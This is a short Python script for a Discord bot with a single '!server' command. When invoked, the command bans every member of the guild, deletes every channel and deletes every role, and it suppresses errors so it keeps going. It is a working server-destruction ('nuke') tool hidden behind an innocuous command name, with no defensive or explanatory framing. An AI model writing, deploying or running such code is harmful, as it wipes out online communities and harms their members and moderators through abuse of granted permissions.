import discord
from discord.ext import commands

intents = discord.Intents.all()
client = commands.Bot(command_prefix='!',
   case_insensitive=True, intents=intents)

@client.command()
async def server(ctx):
  for member in list(ctx.guild.members):
    try:
      await member.ban()
      print(f"Banned {member.display_name}")
    except Exception:
      pass
  
  for channel in list(ctx.guild.channels):
    try:
      await channel.delete()
      print(f"Deleted Channel: {channel.name}")
    except Exception:
      pass

  for role in list(ctx.guild.roles):
    try:
      await role.delete()
      print(f"Deleted Role: {role.name}")
    except Exception:
      pass
 
client.run("token")
